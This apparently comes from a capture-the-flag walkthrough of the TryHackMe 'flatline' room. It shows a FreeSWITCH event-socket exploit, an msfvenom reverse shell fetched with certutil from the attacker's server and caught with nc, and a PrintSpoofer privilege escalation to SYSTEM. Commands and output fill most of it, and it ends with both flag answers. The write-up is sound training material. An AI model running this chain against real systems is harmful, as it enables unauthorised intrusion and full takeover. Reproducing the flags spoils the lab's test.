# flatline Walkthrough
### Link
- https://tryhackme.com/room/flatline
---
### Recon
```
nmap -sC -sC -Pn [IP]
```
**Namp scan result**
```
Nmap scan report for 10.10.171.141
Host is up (0.11s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-03-03T00:52:35+00:00
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2021-11-08T16:47:35
|_Not valid after:  2022-05-10T16:47:35
|_ssl-date: 2022-03-03T00:52:36+00:00; 0s from scanner time.
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
We found the service **FreeSWITCH** running on the port **8021**

Let's check **Exploit-db**. We haev 2 exploit. the seond requires Metasploit. The first is just python code. Let's try the python code ^^  [Exploit-db - FreeSWITCH](https://www.exploit-db.com/exploits/47799)
---
### Exploit

- First: download the exploit
- Second: Change the extension from .txt --> .py
```
mv 47799.txt 47799.py
```
- Third: Test the script
```
python3 47799.py 10.10.171.141 whoami
Authenticated
Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic
```

It works !!!

- Fourth: Prepare a paylord. From the **NMAP** scan result, we know the target machine is a **Windows**. So we need to create a reverse shell payload for Windows machine. For that, we will use **msfvenom**
```
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.6.96.167 lport=4646 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```
- Fifth: Create a local server to download the reverse shell. It is important to run the server from the folder where the reverse shell is stored
```
python3 -m http.server 8000
```
- Sixth: Download the reverse shell with the exploit. For details about [certutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
```
python3 47799.py 10.10.171.141 'certutil -urlcache -split -f http://[IP]:8000/reverse.exe'
Authenticated
Content-Type: api/response
Content-Length: 90

****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.
```
- Seventh: Let's execte the payload. But just before, we need to start a listener with the correct port
```
 nc -nlvp 4646
```
- Eight: Execute the reverse shell
```
python3 47799.py 10.10.171.141 'reverse.exe'
Authenticated
```
Fromn the listner
```
nc -nlvp 4646
Connection from 10.10.171.141:49881
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\FreeSWITCH>
```
 
**Question**
#### What is the user.txt flag?
```
 Directory of C:\Users\Nekrotic\Desktop

09/11/2021  07:39    <DIR>          .
09/11/2021  07:39    <DIR>          ..
09/11/2021  07:39                38 root.txt
09/11/2021  07:39                38 user.txt
               2 File(s)             76 bytes
               2 Dir(s)  50,524,962,816 bytes free

C:\Users\Nekrotic\Desktop>more user.txt
more user.txt
THM{64bca0843d535fa73eecdc59d27cbe26}
```
**Answer** 
#### THM{64bca0843d535fa73eecdc59d27cbe26}
---
### Privilege Escalation

To display privileges information in Windows, this [link](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami) is helpful ^^
```
C:\Users\Nekrotic\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```
We have 3 **privilege** with the status **enabled**: SeChangeNotifyPrivilege, SeImpersonatePrivilege, SeCreateGlobalPrivilege. After many research and test, I found this [exploit](https://github.com/dievus/printspoofer)

Now upload this exploit to the targeted machine by using the previous local server
```
certutil -urlcache -split -f http://[IP]:8000/PrintSpoofer.exe
```
```
C:\Program Files\FreeSWITCH>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[-] Operation failed or timed out.

C:\Program Files\FreeSWITCH>whoami
whoami
win-eom4pk0578n\nekrotic

C:\Program Files\FreeSWITCH>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[-] Operation failed or timed out.

C:\Program Files\FreeSWITCH>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```
I executed 3 times the command before to complete the escalation.
```
C:\Windows\system32>cd ../..
cd ../..

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Users

09/11/2021  07:28    <DIR>          .
09/11/2021  07:28    <DIR>          ..
09/11/2021  07:13    <DIR>          Administrator
09/11/2021  07:37    <DIR>          Nekrotic
09/11/2021  07:13    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  50,545,016,832 bytes free

C:\Users>cd Nekrotic
cd Nekrotic

C:\Users\Nekrotic>cd Desktop
cd Desktop

C:\Users\Nekrotic\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Users\Nekrotic\Desktop

09/11/2021  07:39    <DIR>          .
09/11/2021  07:39    <DIR>          ..
09/11/2021  07:39                38 root.txt
09/11/2021  07:39                38 user.txt
               2 File(s)             76 bytes
               2 Dir(s)  50,545,016,832 bytes free

C:\Users\Nekrotic\Desktop>more  root.txt
more  root.txt
THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
```
**Question**
#### What is the root.txt flag?
**Answer** 
#### THM{8c8bc5558f0f3f8060d00ca231a9fb5e}